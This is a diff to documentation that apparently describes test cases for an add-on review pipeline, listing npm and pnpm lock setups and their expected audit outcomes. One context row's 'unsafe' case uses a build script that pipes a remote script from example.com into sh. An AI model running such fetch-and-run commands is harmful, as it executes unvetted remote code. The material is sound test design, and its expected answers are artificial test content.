@@ -62,9 +62,9 @@ They live outside the repo, in `/home/john/Downloads/reviews/hot/<case id>/`. Ea
 from one of two real submissions by changing only package.json and its lock (and the file
 and folder names, which are invented). The archive's own top folder was renamed to the
 invented name, the source archive was repacked as a zip beside the unchanged `.xpi`, and
-nothing else in the tree changed. The archives were extracted into empty folders and none
-of their scripts ran while the cases were made. Locks were generated with
-`npm install --package-lock-only --ignore-scripts` or
+nothing else in the tree changed, except the pnpm setup of pnpm-reduce (below). The archives
+were extracted into empty folders and none of their scripts ran while the cases were made.
+Locks were generated with `npm install --package-lock-only --ignore-scripts` or
 `pnpm install --lockfile-only --ignore-scripts` (npm 11.17, pnpm 11.26).
 
 - **Base A, `issuebridge-1.2.1`:** a Vue add-on with no Experiment. Its documented release
@@ -114,7 +114,7 @@ safety concern, and the case would end as judged unsafe instead of failed.
 | moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
 | unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | 0 high, 0 critical | row 14: not built, judged unsafe |
 | not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | abort: build issues (`sca-lock-file-multiple`) |
-| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` (the pnpm commands) |
+| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` (the pnpm commands) |
 
 Each case, and why it lands where it does:
 
@@ -122,6 +122,8 @@ Each case, and why it lands where it does:
   no release to move to. Only removing it, as a dependency the release build does not use,
   clears the lock. Confirmed in a scratch copy: with lodash removed and the lock refreshed
   (npm, and pnpm for pnpm-reduce), the audit reads 0 high, 0 critical.
+- **pnpm-reduce** is set up as a current pnpm project must be: it pins its pnpm release and
+  approves its dependencies' install scripts.
 - **fix-builds, fix-fails:** dompurify is imported by the source, so it stays. Its range is
   capped at 3.1.3, the release that fixes both high advisories, so no later release can be
   picked. Confirmed in a scratch copy: `npm audit fix --package-lock-only --ignore-scripts`
